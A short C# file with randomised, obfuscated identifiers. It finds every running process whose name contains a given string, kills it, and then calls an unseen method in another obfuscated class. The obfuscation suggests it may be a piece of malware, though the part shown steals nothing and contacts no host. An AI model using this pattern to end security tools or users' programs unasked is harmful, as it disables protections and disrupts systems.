using System;
using System.Diagnostics;

namespace vQzMGKHeycFziMq;

public class hyvVaROCogn
{
	public static bool NnRyEAXTvzk(Process rhlYmpgjCp, string NwTLyWLaXXwMk)
	{
		try
		{
			return rhlYmpgjCp.ProcessName.ToLower().Contains(NwTLyWLaXXwMk.ToLower());
		}
		catch (InvalidOperationException)
		{
			return false;
		}
		catch (NullReferenceException)
		{
			return false;
		}
		catch
		{
			return false;
		}
	}

	public static void yboxXHEtzlE(string qhOIqPeQYhq, string lBUMJQBuzCQq)
	{
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			if (NnRyEAXTvzk(process, qhOIqPeQYhq.ToLower()))
			{
				try
				{
					process.Kill();
					process.WaitForExit();
					yzZnBHwSsJOOcf.jwTBUSCtlPIOvVR();
				}
				catch (InvalidOperationException)
				{
				}
				catch (PlatformNotSupportedException)
				{
					break;
				}
				catch
				{
				}
			}
		}
	}
}
